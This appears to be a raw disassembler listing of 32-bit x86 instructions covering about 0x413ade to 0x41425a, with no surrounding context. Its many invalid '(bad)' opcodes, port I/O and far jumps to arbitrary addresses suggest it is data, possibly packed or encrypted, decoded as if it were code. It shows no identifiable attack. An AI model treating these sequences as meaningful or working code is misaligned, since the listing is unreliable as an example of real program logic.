  413ade:	in     eax,dx
  413adf:	pusha  
  413ae0:	in     al,dx
  413ae1:	enter  0x3587,0x93
  413ae5:	mov    eax,ebx
  413ae7:	add    DWORD PTR [eax-0x7],esp
  413aea:	mov    ebx,DWORD PTR [ebp+0x3a]
  413aed:	lahf   
  413aee:	leave  
  413aef:	jge    0x413aec
  413af1:	cmp    ch,BYTE PTR [esi+0x27559bc8]
  413af7:	xchg   edx,eax
  413af8:	pop    eax
  413af9:	jmp    0x6ea25082
  413afe:	loop   0x413b55
  413b00:	mov    al,cl
  413b02:	mov    ebx,0xed60116b
  413b07:	cwde   
  413b08:	inc    ebp
  413b09:	data16 cmp BYTE PTR ds:0x3bb76057,ch
  413b10:	sbb    BYTE PTR [ebp-0x25],ch
  413b13:	mov    ah,0xc5
  413b15:	bswap  eax
  413b17:	lds    esi,FWORD PTR [edx-0x79017e20]
  413b1d:	inc    ecx
  413b1e:	mov    ebx,0xf494fe79
  413b23:	or     DWORD PTR [ecx],esi
  413b25:	xchg   ebx,eax
  413b26:	test   eax,0xcdad2948
  413b2b:	cmp    al,BYTE PTR [esi+0x59e87820]
  413b31:	sti    
  413b32:	stc    
  413b33:	mov    ds:0xd03c44a,al
  413b38:	sbb    al,0xf0
  413b3a:	shl    BYTE PTR [ebx],1
  413b3c:	pop    esp
  413b3d:	ror    BYTE PTR [ecx-0x4e],cl
  413b40:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b41:	bound  esp,QWORD PTR [ebp-0x39708d9b]
  413b47:	sub    DWORD PTR [edi+0x28],esi
  413b4a:	mov    eax,0xd70cf11f
  413b4f:	cwde   
  413b50:	and    eax,0x1de24ab
  413b55:	test   al,0xec
  413b57:	jbe    0x413b5b
  413b59:	mov    BYTE PTR [ebx-0x3],dh
  413b5c:	popf   
  413b5d:	mov    ebx,DWORD PTR [eax]
  413b5f:	mov    ebp,0x292605a2
  413b64:	cwde   
  413b65:	lds    ecx,FWORD PTR [edi+ebp*1-0x78]
  413b69:	stos   BYTE PTR es:[edi],al
  413b6a:	sbb    eax,0xb279770d
  413b6f:	mov    ebp,0xf5e29e47
  413b74:	sub    esp,DWORD PTR [ebp+0x437edef2]
  413b7a:	hlt    
  413b7b:	xchg   edx,eax
  413b7c:	(bad)  
  413b7d:	scas   eax,DWORD PTR es:[edi]
  413b7e:	test   BYTE PTR [eax],0x94
  413b81:	pop    esi
  413b82:	iret   
  413b83:	in     al,0xab
  413b85:	xchg   edx,eax
  413b86:	cld    
  413b87:	(bad)  
  413b88:	xchg   esp,eax
  413b89:	push   esp
  413b8a:	(bad)  
  413b8b:	mov    bh,0x68
  413b8d:	mov    dh,ch
  413b8f:	xor    al,0x2b
  413b91:	retf   
  413b92:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b93:	jecxz  0x413bd5
  413b95:	test   eax,0x9b71beda
  413b9a:	or     DWORD PTR [eax],esp
  413b9c:	or     al,0xf5
  413b9e:	inc    edx
  413b9f:	arpl   WORD PTR [edx],dx
  413ba1:	fisttp WORD PTR [ebp+0x5d]
  413ba4:	inc    ecx
  413ba5:	and    eax,0x5c433e41
  413baa:	mov    bl,0xec
  413bac:	ds mov bl,0x3d
  413baf:	test   eax,0x13db3101
  413bb4:	retf   0xf03c
  413bb7:	sub    DWORD PTR [eax],0xccf41f88
  413bbd:	xchg   BYTE PTR [edi+edx*1],dl
  413bc0:	(bad)  
  413bc1:	jnp    0x413b44
  413bc3:	push   ss
  413bc4:	adc    edi,edx
  413bc6:	sbb    bl,al
  413bc8:	adc    ebp,DWORD PTR [ecx+0x4c2a285]
  413bce:	test   eax,0x1570bf5e
  413bd3:	mov    esi,DWORD PTR [ebp-0x28460643]
  413bd9:	push   eax
  413bda:	sahf   
  413bdb:	shl    BYTE PTR [esi+esi*8+0x11afddcd],0x7c
  413be3:	pop    ecx
  413be4:	or     al,0x94
  413be6:	outs   dx,DWORD PTR ds:[esi]
  413be7:	jle    0x413bc2
  413be9:	(bad)  
  413beb:	mov    ecx,0xa6465049
  413bf0:	xchg   edi,eax
  413bf1:	dec    edx
  413bf2:	mov    dh,0x54
  413bf4:	shl    DWORD PTR [ecx+0x29109ca5],0x85
  413bfb:	xchg   ebp,eax
  413bfc:	sbb    al,0xe6
  413bfe:	les    ecx,FWORD PTR [esp+0x7b]
  413c02:	fcom   st(4)
  413c04:	inc    ecx
  413c05:	pop    esp
  413c06:	mov    ecx,0x6e5e4412
  413c0b:	jp     0x413c29
  413c0d:	cmp    al,0xe8
  413c0f:	scas   eax,DWORD PTR es:[edi]
  413c10:	sbb    DWORD PTR [ebp-0x5c736cd0],eax
  413c16:	adc    esp,DWORD PTR [edx-0x37c3459e]
  413c1c:	fcom   QWORD PTR ds:[edx]
  413c1f:	mov    WORD PTR [ecx+eax*8],ss
  413c22:	ins    BYTE PTR es:[edi],dx
  413c23:	add    edi,DWORD PTR [ecx+ebx*2-0xe]
  413c27:	mov    edi,DWORD PTR [ebx]
  413c29:	inc    ecx
  413c2a:	arpl   WORD PTR [eax],sp
  413c2c:	(bad)  
  413c2d:	cld    
  413c2e:	push   es
  413c2f:	xor    BYTE PTR [eax-0x11],bh
  413c32:	cmp    ebx,DWORD PTR [ecx+ecx*4-0x3d]
  413c36:	popf   
  413c37:	cwde   
  413c38:	pop    ebx
  413c39:	sahf   
  413c3a:	aam    0x7c
  413c3c:	loopne 0x413c21
  413c3e:	pop    eax
  413c3f:	popf   
  413c40:	inc    esp
  413c41:	mov    esi,gs
  413c43:	(bad)  
  413c46:	imul   eax,DWORD PTR [ebx-0x2f],0x23
  413c4a:	adc    edx,edi
  413c4c:	enter  0x510d,0x73
  413c50:	jl     0x413c4a
  413c52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413c53:	lods   al,BYTE PTR ds:[esi]
  413c54:	fmul   DWORD PTR [eax-0x54]
  413c57:	stos   BYTE PTR es:[edi],al
  413c58:	sbb    ah,BYTE PTR [eax]
  413c5a:	js     0x413c48
  413c5c:	mov    ds,WORD PTR [ebx-0xf2aab24]
  413c62:	xchg   cl,dl
  413c64:	and    DWORD PTR [edx-0x21],esp
  413c67:	cmp    BYTE PTR [ebx-0x7236cc5a],bl
  413c6d:	or     al,0xbf
  413c6f:	aaa    
  413c70:	cdq    
  413c71:	retf   0x1eaa
  413c74:	out    0xce,al
  413c76:	in     al,dx
  413c77:	ror    DWORD PTR [edx-0x587a923c],0xd3
  413c7e:	mov    dl,0xa1
  413c80:	(bad)  
  413c81:	loope  0x413c57
  413c83:	cmp    BYTE PTR [ebp-0xc13b573],dh
  413c89:	cmp    bh,BYTE PTR [ebx-0x13]
  413c8c:	scas   al,BYTE PTR es:[edi]
  413c8d:	mov    ebx,0x6cf066e0
  413c92:	dec    esi
  413c93:	mov    gs,WORD PTR [edx]
  413c95:	adc    cl,BYTE PTR [esp+esi*8]
  413c98:	jno    0x413c71
  413c9a:	cmc    
  413c9b:	mov    al,0x6e
  413c9d:	dec    ecx
  413c9e:	nop
  413c9f:	jno    0x413c40
  413ca1:	leave  
  413ca2:	dec    ecx
  413ca3:	cmp    DWORD PTR [eax],ebp
  413ca5:	jmp    0x31d77d03
  413caa:	cli    
  413cab:	(bad)  
  413cac:	push   esi
  413cad:	sub    dh,BYTE PTR [ecx-0x79]
  413cb0:	cmp    dh,BYTE PTR [ebp-0x15967e8a]
  413cb6:	rcl    BYTE PTR [esi+eiz*4+0x52],1
  413cba:	mov    esi,0xd15c62d4
  413cbf:	mov    ch,0xb5
  413cc1:	mov    ds,WORD PTR [ebp+0x3a3f7304]
  413cc7:	retf   0xfc5b
  413cca:	adc    eax,0x599d64de
  413ccf:	add    DWORD PTR [ebx-0x6e24a938],0x8899e08e
  413cd9:	xor    bh,0x28
  413cdc:	mov    cl,0x58
  413cde:	leave  
  413cdf:	xchg   edx,eax
  413ce0:	sub    esp,esp
  413ce2:	adc    DWORD PTR [eax],esi
  413ce4:	add    DWORD PTR [ecx+0x320bff49],ebx
  413cea:	and    dl,al
  413cec:	rol    BYTE PTR [eax-0x17],cl
  413cef:	es pushf 
  413cf1:	mov    cl,0xa6
  413cf3:	push   es
  413cf4:	cdq    
  413cf5:	sub    DWORD PTR [ebx+0x4b5584ae],edi
  413cfb:	push   eax
  413cfc:	ret    
  413cfd:	pop    ebp
  413cfe:	pushf  
  413cff:	in     eax,0xeb
  413d01:	pop    ss
  413d02:	cmp    al,0x39
  413d04:	sub    BYTE PTR [edi-0x6d],al
  413d07:	mov    BYTE PTR ds:0x980172f1,0x7e
  413d0e:	mov    esp,0xff9c89a3
  413d13:	adc    eax,0xdc6a6704
  413d18:	push   cs
  413d19:	jns    0x413d73
  413d1b:	mov    dh,0x35
  413d1d:	pop    es
  413d1e:	lock lds ebx,FWORD PTR [edi-0x30d24812]
  413d25:	ret    0xe78
  413d28:	xchg   edx,eax
  413d29:	ins    BYTE PTR es:[edi],dx
  413d2a:	test   eax,0x192d98c
  413d2f:	pop    edx
  413d30:	ret    
  413d31:	sbb    al,0x2c
  413d33:	retf   
  413d34:	adc    ecx,ecx
  413d36:	rcl    DWORD PTR [ecx+0x24],1
  413d39:	inc    edi
  413d3a:	xchg   ecx,eax
  413d3b:	xchg   esi,eax
  413d3c:	das    
  413d3d:	in     eax,dx
  413d3e:	dec    esp
  413d3f:	pop    es
  413d40:	or     BYTE PTR [ebx-0xec7c9f],0x91
  413d47:	xor    edi,esi
  413d49:	loop   0x413d22
  413d4b:	jbe    0x413d78
  413d4d:	cwde   
  413d4e:	inc    edi
  413d4f:	add    DWORD PTR [edx+0x41540c3c],edx
  413d55:	cmp    edi,DWORD PTR [ecx+esi*1+0x5f]
  413d59:	mov    ebp,0x73f431
  413d5e:	clc    
  413d5f:	xchg   esp,eax
  413d60:	xchg   edi,eax
  413d61:	ss in  eax,0xaf
  413d64:	adc    ch,BYTE PTR [edx+0x4082f59e]
  413d6a:	mov    edi,0xcf982575
  413d6f:	pop    es
  413d70:	add    eax,edi
  413d72:	mov    ah,dh
  413d74:	ror    DWORD PTR [eax],cl
  413d76:	invd   
  413d78:	and    BYTE PTR [eax+0x57001fb9],dh
  413d7e:	lods   al,BYTE PTR ds:[esi]
  413d7f:	push   eax
  413d80:	test   BYTE PTR [edi+0x27cbe1da],cl
  413d86:	pusha  
  413d87:	rcl    esi,cl
  413d89:	sub    BYTE PTR [edi-0xec9a09],dl
  413d8f:	in     eax,0xa5
  413d91:	adc    ebx,DWORD PTR [ebx]
  413d93:	inc    ebx
  413d94:	xchg   esp,eax
  413d95:	test   bl,dl
  413d97:	sar    DWORD PTR [ebp+0x7ec09172],cl
  413d9d:	mov    ah,0x42
  413d9f:	ss dec ebp
  413da1:	sbb    DWORD PTR [ecx-0x1bd3dfb4],esp
  413da7:	inc    edi
  413da8:	ss or  dh,dh
  413dab:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413dae:	or     edx,DWORD PTR [ebx]
  413db0:	sub    dl,BYTE PTR [ecx-0x74]
  413db3:	inc    edx
  413db4:	push   edx
  413db5:	xchg   esi,eax
  413db6:	rcr    BYTE PTR [edx],0x45
  413db9:	jo     0x413e2f
  413dbb:	sub    al,0x9b
  413dbd:	imul   ecx,DWORD PTR [edx-0x59c6d5e2],0x76
  413dc4:	mov    ebp,0xc9d6e09f
  413dc9:	rcr    BYTE PTR [ebx+0x63],1
  413dcc:	test   al,0xc9
  413dce:	mov    bl,0x33
  413dd0:	int    0xac
  413dd2:	jbe    0x413dc7
  413dd4:	jae    0x413d9e
  413dd6:	jle    0x413e0c
  413dd8:	jb     0x413d72
  413dda:	mov    eax,0xce031f89
  413ddf:	push   esi
  413de0:	jbe    0x413d92
  413de2:	jmp    0xc129:0x83b3ed40
  413de9:	bound  ecx,QWORD PTR [ebx+0x2083cc86]
  413def:	call   0xf2eb:0xcf976e15
  413df6:	mov    dh,0x20
  413df8:	outs   dx,BYTE PTR ds:[esi]
  413df9:	(bad)  
  413dfa:	pop    edi
  413dfb:	dec    ecx
  413dfc:	test   edx,ecx
  413dfe:	adc    edx,0xffffffb5
  413e01:	inc    edx
  413e02:	and    ebp,DWORD PTR [ebx-0x63]
  413e05:	sti    
  413e06:	mov    edi,0x41f2c82c
  413e0b:	imul   eax,DWORD PTR [ecx+0x5a],0x9344cc13
  413e12:	jg     0x413e20
  413e14:	stos   BYTE PTR es:[edi],al
  413e15:	push   ss
  413e16:	outs   dx,DWORD PTR ds:[esi]
  413e17:	icebp  
  413e18:	pop    ds
  413e19:	sbb    al,0x5a
  413e1b:	in     eax,0x52
  413e1d:	mov    eax,0x361b64d7
  413e22:	js     0x413e84
  413e24:	jmp    0x462f:0x3a393be0
  413e2b:	xchg   ebp,eax
  413e2c:	out    dx,eax
  413e2d:	add    DWORD PTR [ecx-0x7d],eax
  413e30:	fsub   QWORD PTR [edi-0x16]
  413e33:	mov    fs,ebx
  413e35:	fs cmp al,0xa7
  413e38:	mov    bl,0x57
  413e3a:	or     DWORD PTR [edi-0x26c3915c],ecx
  413e40:	cmp    eax,0x535eb816
  413e45:	int    0x7
  413e47:	add    ch,al
  413e49:	rcr    ebx,cl
  413e4b:	out    dx,eax
  413e4c:	lahf   
  413e4d:	outs   dx,DWORD PTR fs:[esi]
  413e4f:	jp     0x413ec3
  413e51:	mov    edi,DWORD PTR [eax]
  413e53:	ret    
  413e54:	call   0x90d4:0x794eb54
  413e5b:	pop    edx
  413e5c:	xlat   BYTE PTR ds:[ebx]
  413e5d:	jge    0x413e8b
  413e5f:	xchg   ebx,eax
  413e60:	xchg   BYTE PTR [ebx-0x6e],ch
  413e63:	add    eax,0x56d2f071
  413e68:	(bad)  
  413e69:	sar    DWORD PTR [eax],cl
  413e6b:	xchg   ebp,eax
  413e6c:	gs call 0xb301:0xe9e2e9e0
  413e74:	mov    bl,0x75
  413e76:	fbstp  TBYTE PTR [ebp-0x2d]
  413e79:	adc    esp,DWORD PTR [ebx+0x21]
  413e7c:	sub    esp,DWORD PTR [edx-0x63]
  413e7f:	sub    al,0xfa
  413e81:	push   0x6cb7c5e8
  413e86:	mov    ebx,0x90ff1a5b
  413e8b:	imul   esp,DWORD PTR [edi+0x7286e87a],0xffffffc8
  413e92:	retf   
  413e93:	sbb    DWORD PTR [eax],eax
  413e95:	jo     0x413e9a
  413e97:	repz dec edx
  413e99:	pop    esp
  413e9a:	cmp    eax,0x9de6e0c1
  413e9f:	scas   al,BYTE PTR es:[edi]
  413ea0:	and    eax,0x65e53950
  413ea5:	inc    ecx
  413ea6:	pusha  
  413ea7:	cmp    ecx,DWORD PTR [edi-0x37]
  413eaa:	icebp  
  413eab:	inc    esi
  413eac:	in     eax,dx
  413ead:	push   edx
  413eae:	mov    DWORD PTR [ebx+0x7efac93a],ebp
  413eb4:	js     0x413eaa
  413eb6:	cmp    al,0x1a
  413eb8:	aam    0xcf
  413eba:	push   ecx
  413ebb:	pop    ds
  413ebc:	stos   BYTE PTR es:[edi],al
  413ebd:	jo     0x413e95
  413ebf:	cmp    al,0x71
  413ec1:	ins    BYTE PTR es:[edi],dx
  413ec2:	(bad)  
  413ec3:	mov    ah,0xdf
  413ec5:	add    BYTE PTR [esi],0xfd
  413ec8:	inc    edi
  413ec9:	stos   BYTE PTR es:[edi],al
  413eca:	fdivrp st(1),st
  413ecc:	pushf  
  413ecd:	iret   
  413ece:	icebp  
  413ecf:	cs push ss
  413ed1:	sbb    DWORD PTR [ebx],esp
  413ed3:	jne    0x413e71
  413ed5:	mov    dl,0x7f
  413ed7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ed8:	sub    edi,DWORD PTR [edi-0x70]
  413edb:	cmp    al,BYTE PTR [eax+0xaf77b4f]
  413ee1:	pop    esp
  413ee2:	call   0x884c5541
  413ee7:	punpckldq mm1,DWORD PTR [eax]
  413eea:	js     0x413ef7
  413eec:	jg     0x413eeb
  413eee:	lods   eax,DWORD PTR ds:[esi]
  413eef:	add    al,0x8c
  413ef1:	jmp    0x68da:0x65bc5020
  413ef8:	dec    esi
  413ef9:	les    ebx,FWORD PTR [ecx-0x69c92e22]
  413eff:	sub    BYTE PTR [edi+0x64],dh
  413f02:	ds loope 0x413eef
  413f05:	sub    al,0xdb
  413f07:	(bad)
  413f0b:	icebp  
  413f0c:	and    edx,DWORD PTR [esp+edi*2-0x6a04a1ff]
  413f13:	mov    ebp,0x650c45eb
  413f18:	fnsave [edx-0x15]
  413f1b:	push   es
  413f1c:	cmp    ch,BYTE PTR [eax+0x4c]
  413f1f:	sub    DWORD PTR [eax+0x2c],edi
  413f22:	xchg   ebp,eax
  413f23:	pop    esp
  413f24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f25:	cwde   
  413f26:	(bad)  
  413f28:	imul   ebp,esp,0xffffff91
  413f2b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413f2c:	dec    esi
  413f2d:	sub    eax,0xfe096a48
  413f32:	push   edx
  413f33:	ficomp WORD PTR [eax-0x693c7750]
  413f39:	mov    esi,DWORD PTR [ebp+0x217bfa2a]
  413f3f:	pusha  
  413f40:	push   edi
  413f41:	cld    
  413f42:	and    al,0x43
  413f44:	and    eax,0xb9db6789
  413f49:	mov    al,0xad
  413f4b:	mov    esi,0x950eb9e4
  413f50:	fcomi  st,st(6)
  413f52:	mov    al,ds:0x490dbeee
  413f57:	nop
  413f58:	inc    ebx
  413f59:	push   es
  413f5a:	outs   dx,BYTE PTR ds:[esi]
  413f5b:	(bad)  
  413f5c:	div    BYTE PTR [ebp+0x6ac476aa]
  413f62:	or     BYTE PTR [esp+ecx*4+0x4f],al
  413f66:	dec    edi
  413f67:	aam    0xcf
  413f69:	jae    0x413f6e
  413f6b:	adc    ebx,DWORD PTR [esi]
  413f6d:	adc    esi,0x63
  413f70:	mov    WORD PTR [edi+0x35],gs
  413f73:	xchg   ebx,eax
  413f74:	jmp    0xa4f76b20
  413f79:	retf   
  413f7a:	ins    BYTE PTR es:[edi],dx
  413f7b:	int    0xd1
  413f7d:	xchg   BYTE PTR [esi+esi*1+0x5f],bh
  413f81:	xchg   edx,eax
  413f82:	pop    edi
  413f83:	in     eax,0x35
  413f85:	push   edi
  413f86:	into   
  413f87:	xchg   edx,eax
  413f88:	shl    DWORD PTR [ebx],1
  413f8a:	add    al,0xf0
  413f8c:	ret    
  413f8d:	jne    0x413f8b
  413f8f:	jge    0x414004
  413f91:	mov    esi,0xc4ef6732
  413f96:	sar    edi,0x31
  413f99:	lods   al,BYTE PTR ds:[esi]
  413f9a:	xchg   di,ax
  413f9c:	pop    edx
  413f9d:	xchg   ebx,eax
  413f9e:	lods   al,BYTE PTR ds:[esi]
  413f9f:	pop    edx
  413fa0:	das    
  413fa1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413fa2:	xor    BYTE PTR [edx+ebp*1],dh
  413fa5:	sbb    BYTE PTR [ebx-0x28],ch
  413fa8:	inc    esp
  413fa9:	sub    ch,dh
  413fab:	mov    dh,0xf3
  413fad:	sub    dh,BYTE PTR [ecx+0x3fcbcb5]
  413fb3:	scas   al,BYTE PTR es:[edi]
  413fb4:	sbb    edi,DWORD PTR [esp+eax*4-0x2c7e03ed]
  413fbb:	jg     0x413fc1
  413fbd:	sbb    eax,0x6a8f1186
  413fc2:	jb     0x413fae
  413fc4:	xchg   edi,eax
  413fc5:	fadd   st(7),st
  413fc7:	cmp    al,0xf4
  413fc9:	into   
  413fca:	addr16 xchg ebx,eax
  413fcc:	fdivr  st(6),st
  413fce:	push   es
  413fcf:	loopne 0x413f99
  413fd1:	repz je 0x413fca
  413fd4:	rcr    dl,0x4
  413fd7:	cmp    DWORD PTR [ebp+edx*2-0x1c],ebx
  413fdb:	jl     0x413fa8
  413fdd:	mov    cl,0x15
  413fdf:	dec    eax
  413fe0:	mov    edi,0xf50710e
  413fe5:	js     0x413ff5
  413fe7:	add    al,0xd5
  413fe9:	jb     0x413fb4
  413feb:	adc    ecx,edi
  413fed:	push   edi
  413fee:	out    dx,eax
  413fef:	(bad)  
  413ff0:	pop    ebp
  413ff1:	mov    al,0xa6
  413ff3:	add    BYTE PTR [edx-0x5b],0xca
  413ff7:	cwde   
  413ff8:	add    al,0x38
  413ffa:	out    dx,eax
  413ffb:	add    BYTE PTR [ebx-0x3e5550e9],dl
  414001:	cmp    BYTE PTR [ecx+eax*2-0xa2708a0],al
  414008:	test   dl,bl
  41400a:	ins    BYTE PTR es:[edi],dx
  41400b:	pop    ds
  41400c:	scas   eax,DWORD PTR es:[edi]
  41400d:	lods   al,BYTE PTR ds:[esi]
  41400e:	pop    edi
  41400f:	sub    bh,bl
  414011:	and    al,0x62
  414013:	and    BYTE PTR [esi+0x436e1602],al
  414019:	xor    al,BYTE PTR [edx-0x21]
  41401c:	repnz add al,0x8f
  41401f:	sub    al,0x72
  414021:	gs mov edi,0x838f2897
  414027:	or     bl,dh
  414029:	mov    DWORD PTR [eax-0x1261aeff],ebp
  41402f:	lods   eax,DWORD PTR ds:[esi]
  414030:	leave  
  414031:	jp     0x414046
  414033:	ror    dh,cl
  414035:	ret    
  414036:	arpl   WORD PTR [esi+0x72f7d9aa],dx
  41403c:	ds pop ds
  41403e:	ds (bad) 
  414040:	dec    ebp
  414041:	int3   
  414042:	adc    BYTE PTR [ebx-0x58],ah
  414045:	mov    esi,0x1eee50f4
  41404a:	mov    edi,0x5d02e334
  41404f:	lds    eax,FWORD PTR [ecx+0x63]
  414052:	xor    al,0x25
  414054:	add    ebx,DWORD PTR [eax]
  414056:	adc    cl,BYTE PTR [ecx]
  414058:	rcr    BYTE PTR [esi+eiz*8-0x35],0x29
  41405d:	mov    ah,BYTE PTR [eax]
  41405f:	xchg   edi,eax
  414060:	outs   dx,BYTE PTR ds:[esi]
  414061:	xor    cl,BYTE PTR [edx-0x496a83ae]
  414067:	jne    0x414023
  414069:	rcl    BYTE PTR [edi-0x1e],1
  41406c:	iret   
  41406d:	popf   
  41406e:	clc    
  41406f:	aas    
  414070:	ins    DWORD PTR es:[edi],dx
  414071:	lods   al,BYTE PTR ds:[esi]
  414072:	jecxz  0x414044
  414074:	dec    edi
  414075:	(bad)  
  414076:	sbb    BYTE PTR [edi+0x46d1f8c3],ch
  41407c:	lds    edx,FWORD PTR [esi]
  41407e:	ret    
  41407f:	push   ebx
  414080:	inc    ecx
  414081:	adc    eax,0xd6020b86
  414086:	cmp    ah,0xcf
  414089:	out    0xd3,al
  41408b:	inc    edx
  41408c:	sub    al,0x47
  41408e:	or     DWORD PTR [ecx+0x1486e94],edx
  414094:	out    dx,eax
  414095:	adc    DWORD PTR [ebx-0x4c],edi
  414098:	fmul   QWORD PTR ss:[eax]
  41409b:	push   esi
  41409c:	outs   dx,BYTE PTR ds:[esi]
  41409d:	ror    BYTE PTR [esp+esi*4-0x5a683266],cl
  4140a4:	in     eax,dx
  4140a5:	js     0x4140fd
  4140a7:	mov    cl,BYTE PTR [edx]
  4140a9:	sbb    ebx,esi
  4140ab:	push   ecx
  4140ac:	test   al,0x67
  4140ae:	retf   0x8ecd
  4140b1:	mov    ch,BYTE PTR [ecx+0x41eb6fc2]
  4140b7:	jbe    0x41407a
  4140b9:	jno    0x414121
  4140bb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4140bc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4140bd:	mov    bl,0xce
  4140bf:	push   eax
  4140c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4140c1:	in     al,0x8b
  4140c3:	jnp    0x4140af
  4140c5:	ret    
  4140c6:	mov    ebx,0x5e679de3
  4140cb:	xlat   BYTE PTR ds:[ebx]
  4140cc:	daa    
  4140cd:	(bad)  
  4140ce:	xor    eax,0x4718d8e2
  4140d3:	rcl    DWORD PTR [ebx-0x24],0x27
  4140d7:	or     al,0x3
  4140d9:	in     al,dx
  4140da:	leave  
  4140db:	jge    0x414095
  4140dd:	popa   
  4140de:	jg     0x414080
  4140e0:	xchg   ebx,esp
  4140e2:	cwde   
  4140e3:	jno    0x414129
  4140e5:	inc    ebp
  4140e6:	jae    0x41413c
  4140e8:	xchg   ebp,eax
  4140e9:	sbb    eax,ecx
  4140eb:	hlt    
  4140ec:	into   
  4140ed:	fwait
  4140ee:	std    
  4140ef:	lods   eax,DWORD PTR ds:[esi]
  4140f0:	imul   esi,esi,0xffffffb0
  4140f3:	or     al,0x3e
  4140f5:	jg     0x414122
  4140f7:	inc    esp
  4140f8:	je     0x41413e
  4140fa:	cdq    
  4140fb:	push   esi
  4140fc:	push   es
  4140fd:	call   0xd9f2b66b
  414102:	fs cmp eax,0xd8f3ea2a
  414108:	push   edx
  414109:	in     eax,dx
  41410a:	imul   edx,DWORD PTR [edx-0x59],0x1e
  41410e:	sub    esp,esi
  414110:	fadd   QWORD PTR [ebx+edi*8+0xe]
  414114:	xchg   ebp,eax
  414115:	sub    edx,DWORD PTR [esi+0x5ab8da3c]
  41411b:	add    DWORD PTR [ecx-0x75],0x2ab9dffd
  414122:	gs aaa 
  414124:	mov    bh,0x6
  414126:	adc    BYTE PTR [ecx],bl
  414128:	out    dx,eax
  414129:	inc    ecx
  41412a:	push   ebx
  41412b:	mov    ds:0x77a885ee,al
  414130:	pushf  
  414131:	xchg   ecx,eax
  414132:	repnz mov eax,ds:0x633e28f1
  414138:	push   es
  414139:	sbb    eax,0xf8e22803
  41413e:	push   es
  41413f:	dec    esp
  414140:	mov    ?,WORD PTR [edx-0x39c6a769]
  414146:	sbb    ecx,DWORD PTR [eax-0x2f9d8368]
  41414c:	nop
  41414d:	call   0x344c:0xd2c9d9f7
  414154:	xor    esp,ebp
  414156:	shr    BYTE PTR [edi],cl
  414158:	lods   eax,DWORD PTR ds:[esi]
  414159:	pop    esi
  41415a:	mov    ecx,0xd7ba6a7a
  41415f:	xchg   ebx,eax
  414160:	mov    eax,ds:0x2bb56c31
  414165:	xchg   ebp,eax
  414167:	lock jne 0x4141cd
  41416a:	call   FWORD PTR [ebx-0x6c]
  41416d:	adc    BYTE PTR [edi-0x75],dh
  414170:	add    esi,ebp
  414172:	sti    
  414173:	inc    edx
  414174:	jg     0x4141aa
  414176:	cmp    edx,DWORD PTR [ebx+ecx*1]
  414179:	fldcw  WORD PTR [eax+eiz*2+0x3bf590ee]
  414180:	mov    edx,0x772eeab5
  414185:	pop    ss
  414186:	pop    esp
  414187:	inc    ecx
  414188:	cli    
  414189:	stc    
  41418a:	pop    ebp
  41418b:	mov    ds:0x2a3c0eaa,al
  414190:	push   edi
  414191:	cwde   
  414192:	ds std 
  414194:	sbb    ebx,ebx
  414196:	jg     0x4141bd
  414198:	clc    
  414199:	push   ds
  41419a:	dec    edi
  41419b:	scas   eax,DWORD PTR es:[edi]
  41419c:	xor    BYTE PTR [ebx+0x2526bded],dl
  4141a2:	or     BYTE PTR [esi-0x7d5bd02e],0xf
  4141a9:	lods   eax,DWORD PTR ds:[esi]
  4141aa:	lods   eax,DWORD PTR ds:[esi]
  4141ab:	cmp    ecx,esp
  4141ad:	dec    edx
  4141ae:	faddp  st(6),st
  4141b0:	aam    0x4
  4141b2:	clc    
  4141b3:	repnz lds edi,FWORD PTR [eax-0x76fed02f]
  4141ba:	cmp    eax,0x68c009d6
  4141bf:	dec    ebp
  4141c0:	adc    DWORD PTR [eax+eax*4+0x15],ebp
  4141c4:	dec    ebp
  4141c5:	lock (bad) 
  4141c7:	adc    al,0x3f
  4141c9:	out    dx,eax
  4141ca:	mov    ch,0x82
  4141cc:	out    dx,al
  4141cd:	outs   dx,DWORD PTR ds:[esi]
  4141ce:	outs   dx,DWORD PTR ds:[esi]
  4141cf:	lea    edx,[edx+edi*8]
  4141d2:	ins    DWORD PTR es:[edi],dx
  4141d3:	mov    eax,ds:0x4f560928
  4141d8:	rol    DWORD PTR [ebx],0xe6
  4141db:	pop    ebx
  4141dc:	xchg   ebp,eax
  4141dd:	das    
  4141de:	fstp   QWORD PTR [eax+eax*4]
  4141e1:	push   esi
  4141e2:	shl    BYTE PTR [edi-0x434b18f0],1
  4141e8:	imul   edx,DWORD PTR [eax+0x6c716a9f],0x26d8f42e
  4141f2:	sbb    DWORD PTR [edx+0x16bcaff9],ebx
  4141f8:	add    eax,0xdfb4bdcb
  4141fd:	push   eax
  4141fe:	sub    BYTE PTR [ebp-0x67444a13],dl
  414204:	sbb    al,bl
  414206:	popf   
  414207:	in     eax,0xdc
  414209:	nop
  41420a:	sbb    BYTE PTR [esi+0x52],0xbf
  41420e:	sbb    BYTE PTR fs:[ebp+0x6c],cl
  414212:	lock lods al,BYTE PTR ds:[esi]
  414214:	mul    BYTE PTR [ecx]
  414216:	jmp    0x1d3e:0xd666fab3
  41421d:	lods   al,BYTE PTR ds:[esi]
  41421e:	fwait
  41421f:	ss jle 0x41428e
  414222:	sbb    eax,0x78468ef4
  414227:	and    BYTE PTR ds:0xd25a1157,0xa6
  41422e:	pop    ebp
  41422f:	retf   
  414230:	(bad)  
  414231:	int    0xdc
  414233:	add    al,0xaf
  414235:	in     eax,dx
  414236:	and    dh,BYTE PTR [ecx-0x1094506b]
  41423c:	xlat   BYTE PTR ds:[ebx]
  41423d:	hlt    
  41423e:	jg     0x41424c
  414240:	dec    ebx
  414241:	rcr    DWORD PTR [edi],1
  414243:	pop    ebx
  414244:	cmc    
  414245:	xchg   edi,eax
  414246:	pop    edi
  414247:	pop    edx
  414248:	(bad)  
  414249:	mov    ebx,0xae6ff0c
  41424e:	jo     0x41426d
  414250:	or     ecx,DWORD PTR [ebx]
  414252:	add    DWORD PTR [ebx+ebx*2],esp
  414255:	or     al,0xc7
  414257:	jge    0x41420a
  414259:	cld    
  41425a:	lea    eax,[eax-0x57]
